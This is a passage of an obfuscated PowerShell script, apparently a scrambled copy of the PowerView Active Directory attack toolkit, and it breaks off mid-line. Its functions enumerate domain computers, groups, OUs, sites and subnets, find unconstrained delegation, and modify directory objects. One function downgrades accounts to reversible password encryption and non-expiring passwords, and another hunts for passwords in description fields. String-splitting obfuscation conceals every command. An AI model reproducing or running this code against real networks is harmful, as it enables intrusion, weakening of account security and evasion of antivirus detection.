    ${Ri`Ghts`Se`ARCHEr} = &("{1}{0}{3}{2}"-f 'DomainS','Get-','archer','e') -ADSpath ${sc`heMApA`TH}.("{0}{1}"-f'repla','ce').Invoke(("{0}{1}" -f 'Sc','hema'),("{3}{2}{4}{0}{1}" -f'i','ghts','t','Ex','ended-R')) -DomainController ${dOM`AInC`o`Nt`R`olLER} -PageSize ${paGEs`i`zE}
    if (${r`I`gH`TsSe`ARCHEr}) {
        ${r`IGH`T`Ss`EARCHer}."F`ILtER" = (("{1}{4}{5}{3}{2}{0}" -f')','(objectCla','ssRight','ce','ss=control','Ac'))
        try {
            ${RIghts`sEar`cHER}.("{2}{1}{0}" -f 'll','indA','F').Invoke() | &("{2}{0}{1}"-f'ere-Obj','ect','Wh') {${_}} | &("{1}{2}{0}" -f'ect','For','Each-Obj') {
                
                ${GUi`dS}[${_}."prOPE`Rti`Es"."r`iG`htSGuid"[0].("{0}{2}{1}" -f 'toS','ing','tr').Invoke()] = ${_}."p`RoPErtI`eS"."n`AmE"[0]
            }
        }
        catch {
            &("{2}{3}{0}{1}" -f 'u','g','Writ','e-Deb') ('Erro'+'r'+' '+'i'+'n '+'buildi'+'ng'+' '+'GU'+'ID '+'m'+'ap: '+"$_")
        }
    }

    ${gu`Ids}
}


function gE`T-Net`coMP`UT`er {


    [CmdletBinding()]
    Param (
        [Parameter(ValUEFrOMpipeLiNE=${tr`Ue})]
        [Alias({"{1}{2}{0}"-f 'tName','Ho','s'})]
        [String]
        ${CoMPu`TErn`A`me} = '*',

        [String]
        ${s`Pn},

        [String]
        ${op`E`RaTIN`GSY`STem},

        [String]
        ${s`erVICe`pAcK},

        [String]
        ${Fi`Lt`Er},

        [Switch]
        ${PrI`NTe`Rs},

        [Switch]
        ${Pi`NG},

        [Switch]
        ${f`ULlD`AtA},

        [String]
        ${D`omaIn},

        [String]
        ${D`omainC`ONT`R`Ol`LER},

        [String]
        ${Ad`sP`ATH},

        [Switch]
        ${UN`CO`N`st`RaINeD},

        [ValidateRange(1,10000)] 
        [Int]
        ${Pa`ge`SiZE} = 200
    )

    begin {
        
        ${c`oMp`SEAR`CHER} = &("{5}{3}{1}{2}{4}{0}" -f'er','omainS','earc','t-D','h','Ge') -Domain ${D`Om`AIn} -DomainController ${D`oM`AiNcOntr`OlL`er} -ADSpath ${ads`P`AtH} -PageSize ${Pa`ge`siZE}
    }

    process {

        if (${co`mPsEaR`CHer}) {

            
            if(${uncO`NStR`A`Ined}) {
                &("{1}{0}{2}{3}" -f 'r','Write-Ve','bos','e') ("{7}{8}{1}{4}{3}{10}{0}{2}{6}{5}{9}" -f'nconst','for ','r','ers with for ','comput','ega','ained del','Searchin','g ','tion','u')
                ${F`IlT`eR} += (("{8}{3}{1}{2}{6}{5}{7}{0}{9}{4}" -f'4.803:=5','ntContr','ol:1.2.84','u',')','.1135','0','56.1.','(userAcco','24288'))
            }
            
            if(${P`RIn`Te`Rs}) {
                &("{3}{2}{1}{0}"-f'se','o','rite-Verb','W') ("{1}{0}{2}{4}{6}{5}{3}"-f'hi','Searc','ng f','ers','or pr','nt','i')
                
                ${FiL`Ter} += (("{8}{2}{3}{4}{7}{5}{6}{1}{0}"-f 'e)','eu','je','ct','Ca','int','Qu','tegory=pr','(ob'))
            }
            if(${s`Pn}) {
                &("{0}{2}{1}{3}" -f'Write-','er','V','bose') ('Se'+'arch'+'ing '+'for'+' '+'comp'+'u'+'te'+'rs '+'with'+' '+'S'+'PN: '+"$SPN")
                ${Fi`LTER} += "(servicePrincipalName=$SPN)"
            }
            if(${OPE`RAti`N`GSyStem}) {
                ${F`IlTER} += "(operatingsystem=$OperatingSystem)"
            }
            if(${SErVI`c`E`paCK}) {
                ${Fi`lter} += "(operatingsystemservicepack=$ServicePack)"
            }

            ${cOM`p`sEa`RCh`er}."fIl`TeR" = "(&(sAMAccountType=805306369)(dnshostname=$ComputerName)$Filter)"

            try {

                ${coMpSe`Arc`HEr}.("{1}{0}{2}" -f'dA','Fin','ll').Invoke() | &("{0}{1}{2}"-f'W','her','e-Object') {${_}} | &("{4}{3}{2}{0}{1}" -f'ec','t','-Obj','ach','ForE') {
                    ${uP} = ${T`RuE}
                    if(${pi`Ng}) {
                        
                        ${up} = &("{0}{3}{2}{1}" -f'Tes','tion','nnec','t-Co') -Count 1 -Quiet -ComputerName ${_}."pROP`erTi`eS"."DNsho`sT`NaME"
                    }
                    if(${u`p}) {
                        
                        if (${Fu`lLda`TA}) {
                            
                            &("{2}{1}{3}{0}{4}"-f'r','LDAP','Convert-','Prope','ty') -Properties ${_}."PropeR`T`iES"
                        }
                        else {
                            
                            ${_}."p`ROPErt`Ies"."DN`SHosTn`AMe"
                        }
                    }
                }
            }
            catch {
                &("{1}{0}{2}"-f'r','Write-Wa','ning') ('Er'+'ror'+': '+"$_")
            }
        }
    }
}


function gE`T-AD`OBJ`ect {


    [CmdletBinding()]
    Param (
        [Parameter(VAlueFROmPIpElinE=${tr`Ue})]
        [String]
        ${s`iD},

        [String]
        ${NA`mE},

        [String]
        ${s`A`maCcOU`NT`NamE},

        [String]
        ${DoMa`in},

        [String]
        ${d`O`mAInC`oNTro`LLer},

        [String]
        ${adS`PA`TH},

        [String]
        ${Fi`LtER},

        [Switch]
        ${rET`UR`NRAw},

        [ValidateRange(1,10000)] 
        [Int]
        ${paG`ESi`ze} = 200
    )
    process {
        if(${s`iD}) {
            
            try {
                ${NA`me} = &("{0}{2}{4}{1}{3}"-f 'Con','m','vert-Si','e','dToNa') ${s`id}
                if(${n`AMe}) {
                    ${C`An`ON`iCAl} = &("{1}{4}{2}{3}{5}{6}{0}"-f 'l','Conve','t','-','r','NT4','toCanonica') -ObjectName ${nA`ME}
                    if(${c`AN`On`iCAl}) {
                        ${DomA`IN} = ${C`A`NoNiC`AL}.("{1}{0}" -f 't','spli').Invoke("/")[0]
                    }
                    else {
                        &("{0}{2}{3}{1}" -f 'Write','ning','-Wa','r') ('Err'+'or'+' '+'re'+'solv'+'i'+'ng '+'SI'+'D '+"'$SID'")
                        return ${Nu`ll}
                    }
                }
            }
            catch {
                &("{1}{0}{4}{3}{2}" -f'te-War','Wri','g','in','n') ('Er'+'ror '+'re'+'s'+'olving '+'SI'+'D '+"'$SID' "+': '+"$_")
                return ${N`ULL}
            }
        }

        ${ob`JE`C`TS`eaRcHEr} = &("{1}{0}{4}{5}{3}{2}" -f 't-Doma','Ge','r','e','i','nSearch') -Domain ${DO`m`AIn} -DomainController ${dom`AIN`Co`NTrOlL`er} -ADSpath ${a`dSP`ATH} -PageSize ${P`AGE`SIzE}

        if(${ob`jecT`S`eaRch`Er}) {

            if(${s`ID}) {
                ${Ob`ject`searcHer}."F`iLTer" = "(&(objectsid=$SID)$Filter)"
            }
            elseif(${NA`me}) {
                ${oB`j`ECTseaRc`HeR}."Filt`ER" = "(&(name=$Name)$Filter)"
            }
            elseif(${SAMaC`cOU`NT`NA`mE}) {
                ${oBje`ctS`e`ArCHeR}."FIl`T`er" = "(&(samAccountName=$SamAccountName)$Filter)"
            }

            ${OBjects`Ea`RcH`Er}.("{0}{2}{1}" -f'Fi','All','nd').Invoke() | &("{2}{1}{0}"-f'e-Object','r','Whe') {${_}} | &("{1}{2}{0}{4}{3}" -f'h','ForE','ac','Object','-') {
                if(${r`ETUrn`RaW}) {
                    ${_}
                }
                else {
                    
                    &("{2}{0}{4}{1}{3}{5}" -f 'LDAPPr','er','Convert-','t','op','y') -Properties ${_}."Pr`OPER`Ties"
                }
            }
        }
    }
}


function se`T-aDo`BJ`eCt {


    [CmdletBinding()]
    Param (
        [String]
        ${s`Id},

        [String]
        ${N`AMe},

        [String]
        ${S`AMAC`CouNTn`AMe},

        [String]
        ${D`O`mAiN},

        [String]
        ${dO`MAIN`CoNT`RolL`er},

        [String]
        ${FI`ltEr},

        [Parameter(manDatoRy = ${tr`UE})]
        [String]
        ${pr`Op`eRtyN`AME},

        ${p`ROpErtYv`ALue},

        [Int]
        ${PR`OPeRT`YXORV`AL`UE},

        [Switch]
        ${C`LEARV`ALUE},

        [ValidateRange(1,10000)] 
        [Int]
        ${p`Ag`eSiZE} = 200
    )

    ${aRg`U`Me`NTS} = @{
        'SID' = ${s`ID}
        ("{0}{1}"-f 'Nam','e') = ${N`AmE}
        ("{1}{3}{2}{0}"-f 'ame','S','mAccountN','a') = ${sama`ccouNTN`AME}
        ("{1}{0}" -f 'ain','Dom') = ${d`o`MAiN}
        ("{4}{0}{3}{2}{1}"-f 'main','er','ontroll','C','Do') = ${d`OM`AInCONtro`llER}
        ("{1}{2}{0}" -f'r','Fi','lte') = ${F`iltER}
        ("{1}{0}"-f 'ageSize','P') = ${pag`Es`ize}
    }
    
    ${RawoB`j`Ect} = &("{2}{0}{1}"-f'-ADOb','ject','Get') -ReturnRaw @Arguments
    
    try {
        
        ${E`Nt`RY} = ${rAw`Ob`JEct}.("{4}{0}{3}{1}{2}" -f 'rect','yEn','try','or','GetDi').Invoke()
        
        if(${Cl`EaRVa`LuE}) {
            &("{1}{3}{0}{2}" -f'Verbos','Write','e','-') ("{2}{0}{1}{3}"-f 'e','arin','Cl','g value')
            ${Ent`RY}.${ProPe`RtyN`AmE}.("{0}{1}"-f 'clea','r').Invoke()
            ${En`TRy}.("{1}{2}{0}" -f'ges','c','ommitchan').Invoke()
        }

        elseif(${PROPer`T`yxORvAL`Ue}) {
            ${t`YpEn`AME} = ${e`NtrY}.${proP`erTy`N`AMe}[0].("{0}{1}" -f'Ge','tType').Invoke()."NA`Me"

            
            ${P`RopERt`yVAluE} = $(${EN`TRy}.${P`ROp`Er`TYNaME}) -bxor ${pRope`R`TYx`orVA`LuE} 
            ${E`NTRY}.${P`ROp`ErtYnaME} = ${propertYvA`l`UE} -as ${tY`Pe`NAMe}       
            ${eNT`RY}.("{1}{2}{4}{0}{3}"-f'i','c','om','tchanges','m').Invoke()     
        }

        else {
            ${EnT`RY}.("{1}{0}" -f't','pu').Invoke(${P`RopeR`TYn`AME}, ${P`RO`pER`TyVa`Lue})
            ${E`NT`Ry}.("{2}{0}{1}"-f'ti','nfo','se').Invoke()
        }
    }
    catch {
        &("{1}{0}{2}{3}" -f't','Wri','e-','Warning') "Error setting property $PropertyName to value '$PropertyValue' for object $($RawObject.Properties.samaccountname) : $_ "
    }
}


function invO`kE`-DOWN`g`Ra`DeAcc`ounT {


    [CmdletBinding()]
    Param (
        [Parameter(PosITIon=0,ValueFROMPipELINe=${t`RuE})]
        [String]
        ${Sa`mac`coU`NTNamE},

        [String]
        ${n`AmE},

        [String]
        ${d`oMA`In},

        [String]
        ${DOmaInC`onTrOl`L`ER},

        [String]
        ${f`I`ltEr},

        [Switch]
        ${r`epAIR}
    )

    process {
        ${Ar`gUm`eNTS} = @{
            ("{2}{0}{1}" -f 'mAcco','untName','Sa') = ${s`AMac`c`oU`NTnamE}
            ("{0}{1}"-f'N','ame') = ${NA`me}
            ("{0}{1}"-f 'D','omain') = ${DO`MAIn}
            ("{1}{3}{0}{2}{4}{5}" -f 'nCon','Doma','t','i','rolle','r') = ${DomAinc`on`TROl`L`ER}
            ("{0}{1}" -f'Fi','lter') = ${F`IlTER}
        }

        
        ${U`Ac`V`AluEs} = &("{0}{2}{3}{1}" -f 'Ge','ct','t','-ADObje') @Arguments | &("{1}{0}" -f 'lect','se') ("{4}{2}{3}{1}{5}{0}"-f'l','c','oun','t','useracc','ontro') | &("{1}{3}{4}{2}{0}" -f 'e','Conver','Valu','tFrom','-UAC')

        if(${rep`AIr}) {

            if(${U`A`CvalUEs}."K`eyS" -contains ("{3}{4}{0}{2}{1}{5}"-f'D_TEXT_','D_ALLOW','PW','ENCRYPT','E','ED')) {
                
                &("{0}{2}{3}{1}"-f 'Set-A','ect','DO','bj') @Arguments -PropertyName ("{2}{4}{5}{0}{1}{3}"-f 'tcont','r','usera','ol','cco','un') -PropertyXorValue 128
            }

            
            &("{2}{0}{1}{3}"-f 't-ADO','bjec','Se','t') @Arguments -PropertyName ("{2}{0}{1}{3}" -f'dla','stse','pw','t') -PropertyValue ('-1')
        }

        else {

            if(${Ua`C`ValU`ES}."kE`Ys" -contains ("{1}{0}{2}{3}"-f 'EXPI','DONT_','R','E_PASSWORD')) {
                
                &("{0}{1}{2}{3}"-f'Se','t-A','DOb','ject') @Arguments -PropertyName ("{0}{2}{3}{4}{1}"-f'us','trol','eracco','untc','on') -PropertyXorValue 65536
            }

            if(${Uac`Val`UEs}."Ke`ys" -notcontains ("{1}{0}{4}{2}{5}{3}" -f 'N','E','TED_TEX','LLOWED','CRYP','T_PWD_A')) {
                
                &("{0}{2}{1}{3}" -f'Se','jec','t-ADOb','t') @Arguments -PropertyName ("{0}{1}{3}{2}" -f'user','acco','trol','untcon') -PropertyXorValue 128
            }

            
            &("{2}{0}{1}" -f'-AD','Object','Set') @Arguments -PropertyName ("{1}{0}{2}{3}"-f 'st','pwdla','s','et') -PropertyValue 0
        }
    }
}


function GeT-c`OM`p`U`TerpROPErTy {


    [CmdletBinding()]
    param(
        [String[]]
        ${p`RO`PerTI`eS},

        [String]
        ${DO`Main},

        [String]
        ${d`om`AiNcoN`Tr`OLLER},

        [ValidateRange(1,10000)] 
        [Int]
        ${PAge`SI`ze} = 200
    )

    if(${P`ROpertI`Es}) {
        
        ${p`RoPer`T`Ies} = ,("{1}{0}" -f'e','nam') + ${p`RO`P`ERties} | &("{1}{2}{0}"-f'ct','Sort-Obj','e') -Unique
        &("{2}{3}{4}{0}{1}"-f'N','etComputer','Ge','t','-') -Domain ${dOM`A`in} -DomainController ${dOm`Ai`Nc`oNTrOlLer} -FullData -PageSize ${Pa`G`esIzE} | &("{2}{1}{3}{4}{0}"-f 'ject','el','S','ect-O','b') -Property ${PrO`PE`RtiES}
    }
    else {
        
        &("{0}{3}{2}{1}" -f'G','Computer','-Net','et') -Domain ${DoM`A`in} -DomainController ${dOmAI`NcO`N`T`ROlLEr} -FullData -PageSize ${pa`g`esI`Ze} | &("{3}{1}{0}{4}{2}" -f'ct-','le','t','Se','Objec') -first 1 | &("{1}{0}{2}{3}" -f't-M','Ge','em','ber') -MemberType ("{0}{2}{1}"-f'*Pro','y','pert') | &("{0}{1}{2}" -f'S','elect-Obj','ect') -Property ("{1}{0}"-f 'e','Nam')
    }
}


function fINd-`C`omPu`T`ERFiEld {


    [CmdletBinding()]
    param(
        [Parameter(positIon=0,VaLUEfroMPIpELInE=${T`RuE})]
        [Alias({"{1}{0}"-f 'm','Ter'})]
        [String]
        ${S`eARCH`TE`Rm} = ("{0}{1}"-f'pas','s'),

        [Alias({"{0}{1}"-f 'Fie','ld'})]
        [String]
        ${s`ear`CH`FIelD} = ("{2}{0}{1}"-f 'cript','ion','des'),

        [String]
        ${aD`SP`ATH},

        [String]
        ${DoMA`IN},

        [String]
        ${d`Om`AINco`NTrolLER},

        [ValidateRange(1,10000)] 
        [Int]
        ${p`Ag`esIZE} = 200
    )

    process {
        &("{2}{4}{1}{0}{3}" -f'pute','Com','Ge','r','t-Net') -ADSpath ${a`DsPA`Th} -Domain ${D`Oma`IN} -DomainController ${domAinc`onTROl`L`Er} -FullData -Filter "($SearchField=*$SearchTerm*)" -PageSize ${Pa`g`e`SiZE} | &("{0}{3}{2}{1}"-f 'Se','ct','ct-Obje','le') ("{1}{0}{2}" -f 'unt','samacco','name'),${SeaR`C`hFiEld}
    }
}


function G`eT-NEtoU {


    [CmdletBinding()]
    Param (
        [Parameter(vAluefroMpIpeLINE=${TR`Ue})]
        [String]
        ${oU`N`Ame} = '*',

        [String]
        ${Gu`Id},

        [String]
        ${Dom`A`iN},

        [String]
        ${doMai`NContR`oLL`Er},

        [String]
        ${A`d`spAtH},

        [Switch]
        ${f`UL`Ldata},

        [ValidateRange(1,10000)] 
        [Int]
        ${p`A`gesizE} = 200
    )

    begin {
        ${o`USEA`RCh`ER} = &("{0}{4}{3}{1}{2}" -f 'Ge','ear','cher','inS','t-Doma') -Domain ${do`MA`IN} -DomainController ${dOMA`INco`N`TrOLLEr} -ADSpath ${adS`pA`TH} -PageSize ${PAG`ESize}
    }
    process {
        if (${o`US`EarCHEr}) {
            if (${Gu`ID}) {
                
                ${O`USeaRch`Er}."filT`eR"="(&(objectCategory=organizationalUnit)(name=$OUName)(gplink=*$GUID*))"
            }
            else {
                ${OUse`Arc`hEr}."fI`Lter"="(&(objectCategory=organizationalUnit)(name=$OUName))"
            }

            ${O`UsEAR`c`HeR}.("{0}{1}"-f 'Fi','ndAll').Invoke() | &("{0}{2}{3}{1}"-f'Wh','ct','ere','-Obje') {${_}} | &("{3}{2}{1}{0}" -f 't','jec','orEach-Ob','F') {
                if (${F`Ull`d`AtA}) {
                    
                    &("{2}{3}{4}{0}{1}{5}"-f'DA','P','Con','v','ert-L','Property') -Properties ${_}."p`RoP`Erti`es"
                }
                else { 
                    
                    ${_}."PROPe`RtI`ES"."aD`sP`ATH"
                }
            }
        }
    }
}


function G`ET-NE`Ts`ITe {


    [CmdletBinding()]
    Param (
        [Parameter(vALUEFromPIpeLInE=${t`RuE})]
        [String]
        ${SiTE`N`Ame} = "*",

        [String]
        ${Do`ma`In},

        [String]
        ${d`oMaI`NCONt`RoLL`er},

        [String]
        ${adSp`A`Th},

        [String]
        ${g`UiD},

        [Switch]
        ${FUl`l`d`Ata},

        [ValidateRange(1,10000)] 
        [Int]
        ${PA`G`eSIZE} = 200
    )

    begin {
        ${SItESea`RCH`Er} = &("{3}{2}{1}{0}"-f'er','mainSearch','t-Do','Ge') -ADSpath ${A`D`sPAtH} -Domain ${dO`M`AIN} -DomainController ${d`oMAIncOn`TrO`ller} -ADSprefix ("{5}{3}{4}{1}{2}{0}"-f'n','igur','atio','s',',CN=Conf','CN=Site') -PageSize ${PAG`ESize}
    }
    process {
        if(${s`iteSear`ch`er}) {

            if (${g`UID}) {
                
                ${sIt`ESE`ARCheR}."F`Ilt`ER"="(&(objectCategory=site)(name=$SiteName)(gplink=*$GUID*))"
            }
            else {
                ${SitESe`A`RcheR}."fI`L`TeR"="(&(objectCategory=site)(name=$SiteName))"
            }
            
            try {
                ${siT`e`SEA`RCHer}.("{1}{2}{0}" -f 'l','Fin','dAl').Invoke() | &("{1}{3}{0}{2}" -f 'Ob','Whe','ject','re-') {${_}} | &("{2}{1}{3}{0}" -f't','c','ForEa','h-Objec') {
                    if (${Fulld`A`Ta}) {
                        
                        &("{2}{0}{4}{3}{1}{6}{5}" -f 'e','L','Conv','-','rt','perty','DAPPro') -Properties ${_}."p`Ro`pErt`iES"
                    }
                    else {
                        
                        ${_}."PR`OpeR`TIes"."n`Ame"
                    }
                }
            }
            catch {
                &("{1}{2}{0}" -f'e-Warning','Wr','it') ${_}
            }
        }
    }
}


function GEt-`NETS`U`BNet {


    [CmdletBinding()]
    Param (
        [Parameter(VAlUeFRoMpiPeLiNE=${TR`Ue})]
        [String]
        ${SiT`En`A`ME} = "*",

        [String]
        ${d`O`maiN},

        [String]
        ${aDs`paTH},

        [String]
        ${DOmAi`NC`ON`TrolLeR},

        [Switch]
        ${FUlLd`ATa},

        [ValidateRange(1,10000)] 
        [Int]
        ${pAGe`sIzE} = 200
    )

    begin {
        ${Su`BnE`TS`eAR`ChER} = &("{2}{1}{0}{4}{3}" -f 'o','et-D','G','Searcher','main') -Domain ${dOMA`iN} -DomainController ${doMaiNCO`N`Tr`o`lleR} -ADSpath ${aD`s`PatH} -ADSprefix ("{0}{6}{2}{3}{1}{4}{7}{9}{5}{8}"-f'C',',CN=S','et','s','it','onfigura','N=Subn','es,CN','tion','=C') -PageSize ${Pa`gESI`zE}
    }

    process {
        if(${SU`BneTSeaRCh`eR}) {

            ${subnet`s`e`Arc`HER}."Fi`Lt`eR"=(("{2}{0}{6}{7}{4}{5}{3}{1}" -f '&(ob','t))','(','ne','gory=s','ub','je','ctCate'))

            try {
                ${S`UBNe`TSe`ARcHeR}.("{1}{0}" -f'indAll','F').Invoke() | &("{0}{2}{3}{1}"-f'Whe','ject','re','-Ob') {${_}} | &("{2}{0}{3}{1}" -f'ch-Ob','ct','ForEa','je') {
                    if (${f`Ul`ldATA}) {
                        
                        &("{5}{0}{4}{2}{1}{3}"-f'o','oper','ert-LDAPPr','ty','nv','C') -Properties ${_}."p`R`OPErTIES" | &("{0}{3}{1}{2}" -f'W','Obj','ect','here-') { ${_}."si`T`eOBJEcT" -match "CN=$SiteName" }
                    }
                    else {
                        
                        if ( (${sit`en`AME} -and (${_}."PropE`Rt`IeS"."SiT`e`object" -match "CN=$SiteName,")) -or (${si`T`ENa`mE} -eq '*')) {

                            ${SuBn`eTpR`oPE`RTies} = @{
                                ("{1}{0}"-f'et','Subn') = ${_}."PROpErT`i`ES"."n`AME"[0]
                            }
                            try {
                                ${suB`NetP`R`opEr`TIEs}[("{0}{1}"-f'Sit','e')] = (${_}."p`Ro`PErti`eS"."s`I`TeobJecT"[0]).("{0}{1}" -f'spli','t').Invoke(",")[0]
                            }
                            catch {
                                ${sU`Bn`etP`ROPe`RTieS}[("{1}{0}" -f'e','Sit')] = ("{0}{1}"-f'Err','or')
                            }

                            &("{2}{1}{0}"-f'ect','j','New-Ob') -TypeName ("{2}{1}{0}" -f 'ect','bj','PSO') -Property ${s`Ub`NETP`RopErtiEs}                 
                        }
                    }
                }
            }
            catch {
                &("{1}{0}{2}{3}"-f'-Wa','Write','rn','ing') ${_}
            }
        }
    }
}


function gEt-`dOm`Ai`NSId {


    param(
        [String]
        ${D`oM`AIN}
    )

    ${Fo`Un`d`domaiN} = &("{2}{1}{3}{0}" -f'Domain','Ne','Get-','t') -Domain ${DO`Ma`IN}
    
    if(${Fo`Un`ddoM`Ain}) {
        
        ${Pr`IMAr`y`dc} = ${f`o`UNdD`omAIn}."pdCR`olE`owNeR"
        ${PrimArYDc`S`Id} = (&("{2}{1}{3}{0}" -f 'ter','NetComp','Get-','u') -Domain ${d`OMain} -ComputerName ${P`RIMAR`YDC} -FullData)."ObJ`Ec`TSId"
        ${pAr`TS} = ${p`R`ImaRy`DCSID}.("{1}{0}" -f 'it','spl').Invoke("-")
        ${PA`RTs}[0..(${P`A`RtS}."L`e`NGTH" -2)] -join "-"
    }
}


function gEt-n`ETGr`ouP {


    [CmdletBinding()]
    param(
        [Parameter(ValUEFroMpIpeLINE=${t`RUE})]
        [String]
        ${GRo`U`PNaME} = '*',

        [String]
        ${S`ID},

        [String]
        ${u`s`erNAME},

        [String]
        ${F`ILt`er},

        [String]
        ${dO`M`AIN},
        
        [String]
        ${Dom`A`iNco`N`TROLLeR},
        
        [String]
        ${AdSP`ATh},

        [Switch]
        ${AdMI`Nc`OuNt},

        [Switch]
        ${fUl`l`d`Ata},

        [Switch]
        ${R`AWs`idS},

        [ValidateRange(1,10000)] 
        [Int]
        ${PA`G`e`sIZe} = 200
    )

    begin {
        ${group`sE`A`RCheR} = &("{2}{4}{1}{0}{5}{3}" -f'm','o','Get-','rcher','D','ainSea') -Domain ${d`OM`AiN} -DomainController ${DO`MaiN`cOnTROl`l`Er} -ADSpath ${Ad`SpaTH} -PageSize ${p`A`gESize}
    }

    process {
        if(${G`RoUpSE`Ar`ChER}) {

            if(${a`dM`INC`ounT}) {
                &("{2}{0}{1}" -f 's','e','Write-Verbo') ("{1}{6}{4}{5}{3}{2}{0}"-f '=1','Che','r adminCount','o','ng',' f','cki')
                ${FIL`T`eR} += ("{1}{0}{2}{3}" -f 'c','(admin','ount=','1)')
            }

            if (${U`s`ErNAme}) {
                
                ${us`eR} = &("{0}{3}{2}{1}" -f'G','ject','DOb','et-A') -SamAccountName ${USer`N`Ame} -Domain ${DOMa`iN} -DomainController ${DOmaiNco`N`T`RO`LL`Er} -ReturnRaw -PageSize ${PA`ge`SIZe}

                
                ${uS`ERDI`Rec`TO`RyeNTRy} = ${US`eR}.("{2}{3}{0}{4}{1}" -f 're','toryEntry','G','etDi','c').Invoke()

                
                ${u`seRD`irecto`RYent`Ry}.("{1}{2}{3}{0}"-f 'e','RefreshC','a','ch').Invoke(("{2}{0}{1}"-f 'rou','ps','tokenG'))

                ${USER`DI`ReCToRy`E`N`TrY}."tOk`enGRou`Ps" | &("{1}{0}{2}" -f 'ch-Obj','Forea','ect') {
                    
                    ${G`R`oupS`id} = (&("{2}{1}{0}"-f'ct','w-Obje','Ne') ("{4}{0}{2}{11}{5}{7}{3}{6}{9}{10}{8}{1}" -f'st','r','em.','y.Pri','Sy','ecu','ncipal.Securi','rit','ntifie','tyI','de','S')(${_},0))."v`AlUe"
                    
                    
                    if(!(${grOu`pSiD} -match ((('^S-1'+'-5-'+'32-5'+'4'+'5'+'srM-51'+'3cJb')  -CrepLAcE([chAr]99+[chAr]74+[chAr]98),[chAr]36-rEPLace ([chAr]115+[chAr]114+[chAr]77),[chAr]124)))) {
                        if(${fuLl`da`Ta}) {
                            &("{0}{2}{3}{1}" -f 'Get-','ect','AD','Obj') -SID ${grOu`ps`Id} -PageSize ${p`A`GEs`IZE}
                        }
                        else {
                            if(${rawSi`dS}) {
                                ${gR`oUPS`Id}
                            }
                            else {
                                &("{4}{1}{2}{5}{3}{0}" -f 'ame','onver','t','idToN','C','-S') ${gRo`UPsID}
                            }
                        }
                    }
                }
            }
            else {
                if (${s`Id}) {
                    ${gR`oU`Ps`e`ArCHeR}."FIL`TER" = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }
                else {
                    ${groUpsEaR`Ch`Er}."fi`ltEr" = "(&(objectCategory=group)(name=$GroupName)$Filter)"
                }
            
                ${gro`UPsE`ArC`her}.("{0}{1}{2}"-f'FindA','l','l').Invoke() | &("{0}{1}{3}{2}"-f 'Where','-O','ct','bje') {${_}} | &("{3}{0}{2}{1}" -f 'O','ct','bje','ForEach-') {
                    
                    if (${fUL`lDa`Ta}) {
                        
                        &("{1}{3}{0}{2}"-f'r','Convert-L','ty','DAPPrope') -Properties ${_}."proPER`TI`eS"
                    }
                    else {
                        
                        ${_}."pRop`Ert`IES"."s`A`m`ACcOuntN`AmE"
                    }
                }
            }
        }
    }
}


function GeT-n`ETg`R`oupMem`BER {


    [CmdletBinding()]
    param(
        [Parameter(VaLuefroMpiPeline=${t`Rue})]
        [String]
        ${Gr`oUPN`AMe},

        [String]
        ${S`id},

        [String]
        ${DO`MaiN} = (&("{0}{1}{2}" -f'Get','-NetDom','ain'))."N`AmE",

        [String]
        ${D`oMAIncOntR`O`L`lER},

        [String]
        ${Ads`PaTH},

        [Switch]
        ${fu`lLDA`TA},

        [Switch]
        ${rE`Cur`Se},

        [Switch]
        ${uSEm`AT`chiNgrU`LE},

        [ValidateRange(1,10000)] 
        [Int]
        ${pag`e`s`IZE} = 200
    )

    begin {
        
        ${GROupSeAr`c`h`eR} = &("{3}{0}{2}{1}" -f'ma','archer','inSe','Get-Do') -Domain ${d`oMA`in} -DomainController ${Dom`Ai`NcoN`TRolL`ER} -ADSpath ${aD`S`pATH} -PageSize ${PA`ge`SizE}

        if(!${D`O`m`AinCONtROl`l`ER}) {
            ${DOma`I`N`CONTrOllER} = ((&("{2}{0}{1}" -f 'ma','in','Get-NetDo'))."pdCrOLe`oWn`er")."na`Me"
        }
    }

    process {

        if (${GRo`UP`sEARcHeR}) {

            if (${reCUR`se} -and ${Us`eMatcH`Ing`RUlE}) {
                
                if (${G`Ro`UpNamE}) {
                    ${grO`Up} = &("{2}{1}{0}"-f 'roup','t-NetG','Ge') -GroupName ${GR`OUPN`AME} -Domain ${DOM`A`iN} -FullData -PageSize ${PA`G`esIzE}
                }
                elseif (${S`ID}) {
                    ${gR`oUP} = &("{1}{0}{3}{2}" -f't-Net','Ge','oup','Gr') -SID ${S`iD} -Domain ${Do`M`Ain} -FullData -PageSize ${paG`E`SIZE}
                }
                else {
                    
                    ${s`id} = (&("{2}{1}{3}{0}"-f 'ID','-Dom','Get','ainS') -Domain ${do`M`AIn}) + ("{0}{1}"-f '-51','2')
                    ${GR`O`Up} = &("{2}{1}{0}" -f'oup','Gr','Get-Net') -SID ${s`id} -Domain ${d`OmaIn} -FullData -PageSize ${pAGe`SI`ZE}
                }
                ${GROU`P`dN} = ${gR`ouP}."DIS`TInGui`shEdNA`mE"
                ${GRO`UPFOUnd`N`Ame} = ${Gro`UP}."Na`me"

                if (${gR`oU`pdN}) {
                    ${G`ROU`pS`eARch`eR}."fILT`er" = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupDN)$Filter)"
                    ${Gro`U`PSEarcHER}."P`Ro`PErtIESt`oLOAd".("{1}{0}" -f'ge','AddRan').Invoke((("{0}{3}{1}{2}"-f'dist','guished','Name','in'),("{2}{1}{0}{3}"-f 'account','m','sa','type'),("{0}{3}{1}{2}"-f 'l','t','logon','as'),("{2}{0}{4}{3}{1}"-f 'gon','mestamp','lastlo','i','t'),("{2}{1}{4}{0}{3}"-f 'agationda','orepro','dsc','ta','p'),("{1}{0}{2}"-f'e','obj','ctsid'),("{2}{1}{0}" -f 'reated','nc','whe'),("{2}{0}{3}{1}{4}" -f 'pa','word','bad','ss','time'),("{3}{0}{2}{1}{4}"-f 'c','ntexpire','ou','ac','s'),("{2}{5}{1}{3}{4}{0}" -f't','c','iscri','alsyst','emobjec','ti'),("{0}{1}"-f 'nam','e'),("{1}{2}{0}" -f 'changed','us','n'),("{1}{2}{0}"-f 'egory','obj','ectcat'),("{3}{2}{1}{0}"-f'tion','crip','s','de'),("{0}{1}{2}" -f'c','odepag','e'),("{1}{0}{2}" -f'ancetyp','inst','e'),("{2}{0}{1}"-f'd','e','countryco'),("{1}{5}{4}{2}{3}{0}" -f'name','dis','ishe','d','gu','tin'),'cn',("{0}{1}{2}"-f'adminco','u','nt'),("{1}{2}{0}"-f 's','logonhou','r'),("{1}{3}{2}{0}" 